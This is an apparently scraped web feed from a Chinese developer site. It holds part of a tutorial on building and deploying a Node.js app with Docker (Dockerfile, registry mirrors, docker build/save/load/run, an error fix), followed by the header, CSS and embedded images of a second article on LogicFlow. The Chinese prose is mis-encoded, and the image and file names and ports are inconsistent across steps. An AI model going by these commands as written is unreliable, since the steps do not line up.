ENV CARGO_TARGET_MIPS_UNKNOWN_LINUX_MUSL_RUSTFLAGS='-C target-feature=+crt-static'
ENV CARGO_TARGET_MIPSEL_UNKNOWN_LINUX_MUSL_RUSTFLAGS='-C target-feature=+crt-static'
ENV CARGO_TARGET_MIPS64_UNKNOWN_LINUX_MUSLABI64_RUSTFLAGS='-C target-feature=+crt-static'
ENV CARGO_TARGET_MIPS64EL_UNKNOWN_LINUX_MUSLABI64_RUSTFLAGS='-C target-feature=+crt-static'

# Expect our source code to live in /home/rust/src
WORKDIR /home/rust/src
</span></code></pre>
<h4 data-id="heading-22">é¡¹ç›®é…ç½®</h4>
<p>åœ¨æˆ‘ä»¬é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹é¢æ­å»ºä¸€ä¸ªæ–‡ä»¶,é‡Œé¢é…ç½®æˆ‘ä»¬éœ€è¦çš„ç›¸å…³ä¿¡æ¯</p>
<h5 data-id="heading-23">åˆ›å»º <code>Dockerfile</code> æ–‡ä»¶</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Dockerfile</span>

# ä½¿ç”¨å®˜æ–¹ <span class="hljs-title class_">Node</span>.<span class="hljs-property">js</span> è¿è¡Œæ—¶ä½œä¸ºåŸºç¡€é•œåƒ
<span class="hljs-variable constant_">FROM</span> <span class="hljs-attr">node</span>:<span class="hljs-number">18</span>-alpine

# è®¾ç½®å·¥ä½œç›®å½•
<span class="hljs-variable constant_">WORKDIR</span> /app

# å¤åˆ¶ package.<span class="hljs-property">json</span> å’Œ package-lock.<span class="hljs-property">json</span>
<span class="hljs-variable constant_">COPY</span> package*.<span class="hljs-property">json</span> ./

# å®‰è£…é¡¹ç›®ä¾èµ–
<span class="hljs-variable constant_">RUN</span> npm install

# å¤åˆ¶é¡¹ç›®æºä»£ç 
<span class="hljs-variable constant_">COPY</span> . .

# æš´éœ²åº”ç”¨ç«¯å£ï¼ˆæ ¹æ®ä½ çš„åº”ç”¨ä¿®æ”¹ï¼‰
<span class="hljs-variable constant_">EXPOSE</span> <span class="hljs-number">3000</span>

# è¿è¡Œåº”ç”¨çš„å‘½ä»¤ï¼ˆæ ¹æ®ä½ çš„å…¥å£æ–‡ä»¶ä¿®æ”¹ï¼‰
<span class="hljs-variable constant_">CMD</span> [<span class="hljs-string">"node"</span>, <span class="hljs-string">"app.js"</span>]
</code></pre>
<h5 data-id="heading-24">åˆ›å»º<code>.dockerignore</code>æ–‡ä»¶</h5>
<pre><code class="hljs language-javascript" lang="javascript">node_modules
npm-debug.<span class="hljs-property">log</span>
.<span class="hljs-property">git</span>
.<span class="hljs-property">gitignore</span>
<span class="hljs-variable constant_">README</span>.<span class="hljs-property">md</span>
.<span class="hljs-property">env</span>
</code></pre>
<h3 data-id="heading-25">4ã€æ‰“åŒ…éƒ¨ç½²</h3>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨dockeræ‰“åŒ…éƒ¨ç½²nodeé¡¹ç›®</p>
<p>æ‰“åŒ…ä¹‹å‰éœ€è¦å®‰è£…ä¸€ä¸‹æˆ‘ä»¬å¯¹åº”çš„ä¾èµ–é•œåƒï¼Œæˆ‘çš„nodeç‰ˆæœ¬å¦‚ä¸‹ã€‚å¯¹åº”çš„ç‰ˆæœ¬æˆ‘ä»¬å¯ä»¥åœ¨å¯¹åº”çš„éƒ¨åˆ†æŸ¥çœ‹</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-number">22.16</span><span class="hljs-number">.0</span>


å¯¹åº”çš„é•œåƒåœ°å€
<span class="hljs-attr">https</span>:<span class="hljs-comment">//mirrors.aliyun.com/nodejs-release/v22.16.0/?spm=a2c6h.25603864.0.0.52b3773fkunQPT</span>
</code></pre>
<p>é…ç½®é•œåƒæº</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-string">"registry-mirrors"</span>: [
    <span class="hljs-string">"https://docker.m.daocloud.io"</span>,
    <span class="hljs-string">"https://mirror.ccs.tencentyun.com"</span>,
    <span class="hljs-string">"https://mirrors.aliyun.com"</span>,
    <span class="hljs-string">"https://mirrors.huaweicloud.com/repository/docker-ce"</span>,
    <span class="hljs-string">"https://docker.xuanyuan.me"</span>,
  ]
}

</code></pre>
<p>å®Œæ•´çš„é…ç½®å¦‚ä¸‹,é…ç½®å¥½äº†è¿™ä¸ªæ—¶å€™æ‰“åŒ…å·²ç»å¯ä»¥äº†</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-string">"builder"</span>: {
    <span class="hljs-string">"gc"</span>: {
      <span class="hljs-string">"defaultKeepStorage"</span>: <span class="hljs-string">"20GB"</span>,
      <span class="hljs-string">"enabled"</span>: <span class="hljs-literal">true</span>
    }
  },
  <span class="hljs-string">"experimental"</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-string">"registry-mirrors"</span>: [
     <span class="hljs-string">"https://docker.m.daocloud.io"</span>,
    <span class="hljs-string">"https://mirror.ccs.tencentyun.com"</span>,
    <span class="hljs-string">"https://mirrors.aliyun.com"</span>,
    <span class="hljs-string">"https://mirrors.huaweicloud.com/repository/docker-ce"</span>,
    <span class="hljs-string">"https://docker.xuanyuan.me"</span>,
     <span class="hljs-string">"https://mirrors.tuna.tsinghua.edu.cn/docker-ce"</span>
  ]
}
</code></pre>
<p>æ ¹ç›®å½•ä¸‹é¢è¿è¡Œè¿™ä¸ªæ‰“åŒ…å‘½ä»¤</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ‰“åŒ…</span>

docker build -t nexus-node-app .
</code></pre>
<p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è€å¿ƒç­‰å¾…ä¸€ä¼šç„¶åæ‰“åŒ…å°±æˆåŠŸäº†</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœ¬åœ°å¯¼å‡ºæ‰“åŒ…çš„æ–‡ä»¶</span>

docker save -o nexus-node-api.<span class="hljs-property">tar</span> nexus-node-api

è¿™ä¸ªæ—¶å€™åœ¨æˆ‘çš„æ ¹ç›®å½•ä¸‹é¢å·²ç»æœ‰ä¸€ä¸ªæ–‡ä»¶äº†ï¼Œç›´æ¥æŠŠè¿™ä¸ªæ–‡ä»¶ä¸¢åˆ°æˆ‘ä»¬æƒ³è¦çš„nodeæœåŠ¡å™¨å³å¯
nexus-node-api.<span class="hljs-property">tar</span>
</code></pre>
<h5 data-id="heading-26">é•œåƒä¼ è¾“åˆ°æœåŠ¡å™¨ä¸Š</h5>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†å·²ç»æ‰“åŒ…å¥½çš„é¡¹ç›®ç›´æ¥æ”¾åˆ°dockeræœåŠ¡å™¨ä¸Šè¿›è¡Œè¿è¡Œ</p>
<p>æ–¹æ³•ï¼ˆ2ç§ï¼‰</p>
<p>å¯ä»¥ç›´æ¥ä¼ é€ä¸Šå»æˆ–è€…åˆ©ç”¨å‘½ä»¤è¡Œå·¥å…·ç›´æ¥å°†æˆ‘ä»¬çš„é¡¹ç›®ä¼ é€’ä¸Šå»</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨ scp æˆ–å…¶ä»–æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼š </span>
scp my-node-app.<span class="hljs-property">tar</span> user@your-server-<span class="hljs-attr">ip</span>:<span class="hljs-regexp">/home/u</span>ser/
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// ç™»å½•æœåŠ¡å™¨ï¼Œè¿›å…¥ä½ ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•ï¼Œæ‰§è¡Œï¼š</span>
docker load -i nexus-node-api.<span class="hljs-property">tar</span>
</code></pre>
<h5 data-id="heading-27">è¿è¡Œå®¹å™¨</h5>
<p>åœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œè¿è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript">docker run -d \
  --name my-node-app-container \
  -p <span class="hljs-number">80</span>:<span class="hljs-number">3200</span> \
  --restart unless-stopped \
  your-registry/my-node-<span class="hljs-attr">app</span>:v1<span class="hljs-number">.0</span><span class="hljs-number">.0</span>
    
  <span class="hljs-comment">// è¿™é‡Œçš„æ‰§è¡Œå‘½ä»¤ä¸º</span>
  docker run -d \
  --name nexus-node-api \
  -p <span class="hljs-number">3200</span>:<span class="hljs-number">3200</span> \
  -e <span class="hljs-variable constant_">NODE_ENV</span>=production \
  nexus-node-<span class="hljs-attr">api</span>:latest
</code></pre>
<p>æŸ¥çœ‹æˆ‘ä»¬å®¹å™¨çš„è¿è¡ŒçŠ¶æ€</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æŸ¥çœ‹å®¹å™¨æ˜¯å¦æˆåŠŸè¿è¡Œ</span>
docker ps

<span class="hljs-comment">// æŸ¥çœ‹å®¹å™¨æ—¥å¿—</span>
docker logs nexus-node-api

<span class="hljs-comment">// å®æ—¶æŸ¥çœ‹æ—¥å¿—</span>
docker logs -f nexus-node-api


<span class="hljs-comment">// åœæ­¢å®¹å™¨</span>
docker stop nexus-node-api

<span class="hljs-comment">// é‡å¯å®¹å™¨ï¼š</span>
docker restart nexus-node-api


<span class="hljs-comment">// åˆ é™¤å®¹å™¨ï¼ˆéœ€è¦å…ˆåœæ­¢ï¼‰ï¼š</span>
docker rm nexus-node-api

</code></pre>
<p>è¿™ä¸ªæ—¶å€™æˆ‘å·²ç»å¯ä»¥çœ‹åˆ°æˆ‘çš„é¡¹ç›®è¿è¡Œä»¥åŠæ—¥å¿—äº†</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// docker logs nexus-node-api</span>

ç‰ˆæœ¬å·nexus  <span class="hljs-variable constant_">V0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> 
${author}çƒ­çƒˆæ¬¢è¿ä½ è®¿é—®<span class="hljs-title class_">Node</span>åç«¯æœåŠ¡å™¨
åˆå§‹åŒ–ws
<span class="hljs-title class_">WebSocket</span> æœåŠ¡å™¨å·²å¯åŠ¨ï¼Œç›‘å¬ç«¯å£ <span class="hljs-number">3000</span>
åˆå§‹åŒ–wsèŠå¤©å®¤
wsèŠå¤©å·²å¯åŠ¨ï¼Œç›‘å¬ç«¯å£ <span class="hljs-number">3001</span>
<span class="hljs-title class_">Server</span> is running on <span class="hljs-attr">http</span>:<span class="hljs-comment">//0.0.0.0:3200</span>
æ•°æ®åº“è¿æ¥æˆåŠŸğŸ˜Š,æˆ‘æ˜¯æ—å¤ªç™½
</code></pre>
<h4 data-id="heading-28">æ‰“åŒ…nodeé¡¹ç›®æç¤ºå¤„ç†</h4>
<p>è¿™ä¸ªæ—¶å€™æç¤ºæˆ‘ä»¬</p>
<pre><code class="hljs language-javascript" lang="javascript"> =&gt; <span class="hljs-variable constant_">ERROR</span> [internal] load metadata <span class="hljs-keyword">for</span> docker.<span class="hljs-property">io</span>/library/<span class="hljs-attr">node</span>:<span class="hljs-number">18</span>-alpine                               <span class="hljs-number">21.</span>1s
------
 &gt; [internal] load metadata <span class="hljs-keyword">for</span> docker.<span class="hljs-property">io</span>/library/<span class="hljs-attr">node</span>:<span class="hljs-number">18</span>-<span class="hljs-attr">alpine</span>:
------
<span class="hljs-title class_">Dockerfile</span>:<span class="hljs-number">2</span>
--------------------
   <span class="hljs-number">1</span> |     # ä½¿ç”¨å®˜æ–¹ <span class="hljs-title class_">Node</span>.<span class="hljs-property">js</span> è¿è¡Œæ—¶ä½œä¸ºåŸºç¡€é•œåƒ
   <span class="hljs-number">2</span> | &gt;&gt;&gt; <span class="hljs-variable constant_">FROM</span> <span class="hljs-attr">node</span>:<span class="hljs-number">18</span>-alpine
   <span class="hljs-number">3</span> |
   <span class="hljs-number">4</span> |     # è®¾ç½®å·¥ä½œç›®å½•
--------------------
<span class="hljs-attr">ERROR</span>: failed to <span class="hljs-attr">build</span>: failed to <span class="hljs-attr">solve</span>: <span class="hljs-attr">node</span>:<span class="hljs-number">18</span>-<span class="hljs-attr">alpine</span>: failed to resolve source metadata <span class="hljs-keyword">for</span> docker.<span class="hljs-property">io</span>/library/<span class="hljs-attr">node</span>:<span class="hljs-number">18</span>-<span class="hljs-attr">alpine</span>: failed to <span class="hljs-keyword">do</span> <span class="hljs-attr">request</span>: <span class="hljs-title class_">Head</span> <span class="hljs-string">"https://registry-1.docker.io/v2/library/node/manifests/18-alpine"</span>: dialing registry-<span class="hljs-number">1.</span>docker.<span class="hljs-property">io</span>:<span class="hljs-number">443</span> container via direct connection because disabled has no <span class="hljs-variable constant_">HTTPS</span> <span class="hljs-attr">proxy</span>: connecting to registry-<span class="hljs-number">1.</span>docker.<span class="hljs-property">io</span>:<span class="hljs-number">443</span>: dial tcp <span class="hljs-number">108.160</span><span class="hljs-number">.161</span><span class="hljs-number">.83</span>:<span class="hljs-number">443</span>: <span class="hljs-attr">connectex</span>: A connection attempt failed because the connected party did not properly respond after a period <span class="hljs-keyword">of</span> time, or established connection failed because connected host has failed to respond.

<span class="hljs-title class_">View</span> build <span class="hljs-attr">details</span>: docker-<span class="hljs-attr">desktop</span>:<span class="hljs-comment">//dashboard/build/desktop-linux/desktop-linux/ste681kfzh01gt53di0y8ii61</span>
</code></pre>
<h5 data-id="heading-29">å¤„ç†è§£å†³</h5>
<p>è¿™ä¸ªæ—¶å€™å¤§å¤šæ•°éƒ½æ˜¯é…ç½®å’Œé•œåƒçš„é—®é¢˜ï¼Œè¿™é‡Œæˆ‘æ¢æˆäº†æ¸…åé•œåƒç«™ï¼Œç„¶åé‡æ–°éƒ¨ç½²äº†ä¸€ä¸‹å°±okäº†</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LogicFlow äº¤äº’æ–°ä½“éªŒï¼šå‘Šåˆ«ç›´è¿ï¼Œä¸æ»‘è´å¡å°”è½¨è¿¹å®æˆ˜ï¼ğŸ«]]></title>    <link>https://juejin.cn/post/7589168816527949851</link>    <guid>https://juejin.cn/post/7589168816527949851</guid>    <pubDate>2025-12-30T03:36:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589168816527949851" data-draft-id="7589166195796951067" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LogicFlow äº¤äº’æ–°ä½“éªŒï¼šå‘Šåˆ«ç›´è¿ï¼Œä¸æ»‘è´å¡å°”è½¨è¿¹å®æˆ˜ï¼ğŸ«"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Vue.js"/> <meta itemprop="datePublished" content="2025-12-30T03:36:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ©™æŸäºº"/> <meta itemprop="url" content="https://juejin.cn/user/1908407919184670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LogicFlow äº¤äº’æ–°ä½“éªŒï¼šå‘Šåˆ«ç›´è¿ï¼Œä¸æ»‘è´å¡å°”è½¨è¿¹å®æˆ˜ï¼ğŸ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1908407919184670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ©™æŸäºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T03:36:26.000Z" title="Tue Dec 30 2025 03:36:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC5jfyA/J5CoVhQ/CmplALKekod5SLlKeWTClXFQYWlwlVZplKj0qTSo/JGlaBqrspUnatapFqpelL1luprNYKahVqgGlttqVqN2mm1e2oj6lR1J/Vo9Tz1deqH1a+pD2rgNCw0gjW4GiUaezUuavRTUVRTaiCVQ11F3Ue9TB3QxGpaarI0szXLNY9qdmoOa2louWolai3UqtE6qyWjoWgWNBYtl7aBdoJ2l/ZlmsE05jTetLXTGqb1TBvV1tP21+Zpl2k3avdqf9Gh6wTr5Ohs0mnWeaKL1rXRnaW7QHeX7mXd13qaet56HL0yvRN6D/VhfRv9WP3F+nv1b+qPGBgahBqIDLYbXDR4bUgz9DfMNtxieM5wyIhq5GskMNpidN7oJV2LzqTn0qvol+jDxvrGYcZS4z3GncZjJpYmCSYrTRpNnpgSTRmmmaZbTNtNh82MzKLMis3qzR6aE8wZ5nzzbeYd5qMWlhZJFqstmi0GLbUtWZZFlvWWj60oVn5W+Va1Vne